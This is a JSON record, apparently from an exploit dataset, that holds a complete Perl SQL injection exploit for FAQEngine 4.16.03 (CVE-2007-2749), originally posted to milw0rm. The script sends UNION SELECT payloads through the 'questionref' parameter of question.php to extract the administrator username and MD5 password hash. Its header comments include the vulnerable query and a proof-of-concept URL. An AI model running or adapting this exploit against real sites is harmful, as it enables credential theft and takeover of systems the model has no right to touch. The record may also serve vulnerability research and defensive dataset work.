{
  "id": "3943",
  "title": "FAQEngine 4.16.03 - &#039;question.php?questionref&#039; SQL Injection",
  "cve": "CVE-2007-2749",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t            FAQEngine <= v4.16.03 SQL Injection Exploit\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (question.php):\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#      $sql = \"select * from \".$tableprefix.\"_questions where publish=1 \t#\r\n#      and questionref=$questionref order by enterdate desc\";\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: question.php?mode=display&questionref=-999 UNION SELECT 0,0,0,0,\t\t#\r\n#      username,password,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: The question display mode being enabled\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\n\r\nif (@ARGV < 1){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                 FAQEngine <= v4.16.03 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_faqengine.pl [PATH]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where FAQEngine is located\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_faqengine.pl http://victim.com/faq/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n\r\n@paths = (\r\n\"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,username,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\",\r\n\"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,username,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\",\r\n\"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,username,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\"\r\n);\r\n\r\nfor($i=0;$i<3;$i++){\r\n  $host = $ARGV[0] . $paths[$i];\r\n  $res = $b->request(HTTP::Request->new(GET=>$host));\r\n  ($user) = $res->content =~ /\">([0-9a-zA-Z]+)<\\/span><\\/td><\\/tr>/;\r\n\r\n  if($user){ last; }\r\n}\r\n\r\nif($user){\r\n  print \"-------------------------------------------------------------------------\\r\\n\";\r\n  print \"                 FAQEngine <= v4.16.03 SQL Injection Exploit\\r\\n\";\r\n  print \"-------------------------------------------------------------------------\\r\\n\";\r\n  print \"[+] Admin User : $user\\n\";\r\n}\r\n\r\n\r\n@paths = (\r\n\"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,password,0,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\",\r\n\"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,password,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\",\r\n\"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,password,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*\"\r\n);\r\n\r\nfor($i=0;$i<3;$i++){\r\n  $host = $ARGV[0] . $paths[$i];\r\n  $res = $b->request(HTTP::Request->new(GET=>$host));\r\n  ($hash) = $res->content =~ /([0-9a-fA-F]{32})/;\r\n  if($hash){ last; }\r\n}\r\n\r\nif($hash){\r\n  print \"[+] Admin Hash : $hash\\n\";\r\n  print \"-------------------------------------------------------------------------\\r\\n\";\r\n  print \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\n  print \"            \t\t        ...Silentz\\r\\n\";\r\n  print \"-------------------------------------------------------------------------\\r\\n\";\r\n} else {\r\n  print \"\\nExploit Failed...\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-05-16]",
  "url": "https://www.exploit-db.com/exploits/3943"
}